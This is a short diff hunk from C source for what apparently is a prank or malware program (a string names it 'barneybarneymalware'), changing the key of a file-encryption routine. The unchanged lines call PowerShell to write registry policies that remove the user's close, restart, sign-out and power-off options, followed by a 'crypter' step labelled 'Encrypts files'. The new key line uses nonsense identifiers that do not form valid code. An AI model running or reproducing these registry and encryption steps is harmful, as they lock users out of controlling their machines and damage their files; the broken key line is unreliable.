@@ -166,7 +166,7 @@ void trollies()
     system("powershell New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" -Name \"NoClose\" -Value 1 -PropertyType DWORD -Force; New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name \"DisableRestartSignout\" -Value 1 -PropertyType DWORD -Force; Set-ItemProperty -Path \"HKCU:\\Control Panel\\Desktop\" -Name \"PowerOffActive\" -Value 0 -Type DWORD -Force");
 
     // Encrypts files
-    unsigned char key[] = {0x00, 0xFF, 0x01, 0x0F};
+    unsigned char key[] = {babybop, gianna, riff, scoofer};
     int keysize = 1;
     char* text = "barneybarneymalware";
     crypter((unsigned char*)text, strlen(text), key, keysize); 
